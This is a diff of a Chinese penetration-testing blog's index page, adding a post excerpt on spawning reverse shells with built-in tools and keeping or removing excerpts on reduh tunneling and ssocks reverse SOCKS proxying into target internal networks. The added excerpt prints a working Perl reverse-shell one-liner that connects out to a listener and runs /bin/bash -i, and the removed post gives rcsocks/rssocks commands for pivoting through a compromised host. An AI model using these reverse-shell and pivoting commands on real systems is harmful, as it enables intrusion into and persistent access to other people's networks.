@@ -139,6 +139,41 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/09/27/revese-shell/">
+                你和目标只差一个shell的距离
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-27</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/shell/">shell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前奏说明<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……</p>
+<p>0x02 大致环境<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">win7</span>          192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.128</span></div><div class="line"><span class="selector-tag">centos6</span><span class="selector-class">.8</span>     192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.129</span></div><div class="line"><span class="selector-tag">win2008R2</span>     192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.131</span></div><div class="line"><span class="selector-tag">kali</span>          192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.147</span></div></pre></td></tr></table></figure></p>
+<p>0x03 关于linux平台下弹shell的一些方式</p>
+<p>利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;nc -lvp 53</div><div class="line"># perl -<span class="keyword">e</span> '<span class="keyword">use</span> Socket;<span class="variable">$i</span>=<span class="string">"192.168.1.128"</span>;<span class="variable">$p</span>=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">"tcp"</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);exec(<span class="string">"/bin/bash -i"</span>);&#125;;'</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_perl.png" alt="&#39;&#39;"><br><br>
+        </div>
+        <a href="/2016/09/27/revese-shell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/09/26/install-py27-on-centos/">
                 快速编译安装配置 py2.7 & jdk 1.7
             </a>
@@ -600,53 +635,6 @@
 <p>0x03 隧道建立成功后,即可使用 mstsc,putty 等工具连接到本地绑定的端口[此处是绑定到本地的8088],当你访问本地的8088就相当于访问目标机器的3389[你也可以换成22,以及你想代理的任何端口,前提是目标的这个端口必须先开了才行]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></div><div class="line">putty <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/reduh_php_create_tunnel_success.png" alt=""></p>
 <p>关于reduh:<br>&nbsp;&nbsp;&nbsp;&nbsp;工具已经非常老了,应该是在很早之前,reduh的官网就已经发过相关声明,称reduh项目已经不再维护,现在已经被更好用的regerog所替代,不过,你要是实在没办法,还是可以尝试用下这个的,实际测试中,个人感觉reduh要比tunna还要好用一点,其实,所谓的好不好,跟目标实际环境和代码本身都有很大关系,这个也没必要非要分个好赖,适合自己的就是最好的,有兴趣可以仔细去详读一下工具代码<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/12/ssocks/">
-                通向彼岸 之内网代理转发 [ ssocks反向代理篇 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-12</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/socks/">socks</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:</p>
-<p>关于socks反向代理原理的简要说明:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,socks反向代理的通信原理还是比较简单的,就是在控制端和目标端同时开放一个端口,作为两端机器之间通信的这么一个专属通道[有点儿类似管道],说的再形象一点,是这样,当控制端想访问目标内网中的其他的机器的某个端口,目标端就会帮忙把要访问的那个端口的数据拿过来,放到之前已经建立好的这条通道的端口上,然后,控制端直接到这个地方来取即可,有点儿类似中介,socket嘛,本来就是个管道</p>
-<p>在linux中使用ssocks:<br>0x01 如果目标是linux机器,可能还需要你自己先编译安装下ssocks,步骤非常简单,如下,如果过程中有什么报错,仔细看下报的具体是什么错误,顺手解决下,如果是编译器或者依赖库的问题,按照相应的提示装上即可:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf ssocks-0.0.14.tar.gz</span></div><div class="line"><span class="comment"># cd ssocks-0.0.14</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
-<p>0x02 先在本地机器上执行,一般都是你自己的vps,如果开了防火墙记得把该端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sscosk_client.png" alt=""></p>
-<p>0x03 到目标机器上执行[自带台运行选项,实际渗透中可以把它加上]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sscosk_server.png" alt=""></p>
-<p>0x04 再回到自己本地通过各种socks代理工具,连到vps的socks代理的端口上,即可轻松访问目标内网中的资源<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">proxychains</div><div class="line">proxifier</div><div class="line">putty</div></pre></td></tr></table></figure></p>
-<p><img src="/img/sscosk_proxifier.png" alt=""><br><img src="/img/sscosk_proxifier_ssh.png" alt=""><br><img src="/img/sscosk_proxifier_res.png" alt=""></p>
-<p>0x05 从连接信息中我们看到了socks连接建立成功的提示,如下<br><img src="/img/sscosk_proxifier_res_1.png" alt=""><br><img src="/img/sscosk_proxifier_res_2.png" alt=""></p>
-<p><br><br>在win中使用ssocks:</p>
-<p>0x01 本地机器上执行,一般都是自己的vps,如果开了防火墙记得把该端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks.exe -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sscosk_win_rcsocks.png" alt=""></p>
-<p>0x02 到目标机器上执行[自带台运行选项,实际渗透中可以把它加上]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks.exe -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sscosk_win_rssocks.png" alt=""></p>
-<p>0x03 依然是回到自己本地通过各种socks代理工具,连到vps的socks代理的端口上,而后正常的访问目标内网资源即可<br><img src="/img/sscosk_win_proxifier.png" alt=""><br><img src="/img/sscosk_win_proxifier_rule.png" alt=""><br><img src="/img/sscosk_win_proxifier_res.png" alt=""><br><br></p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这也是实际渗透过程个人比较推荐的内网代理方式,尤其当目标机器存在公网ip的时候,用这种方式进行内网渗透无疑是极好的,此工具基本是没有任何依赖,使用简单粗暴,相对来说也比较轻量,免杀就更不用说了[因为根本就不需要免杀],除此之外,还有很多其它优点,这里就不一一说了,大家自己多实践就会感受到了<br><br><br></p>
 
         </div>
     
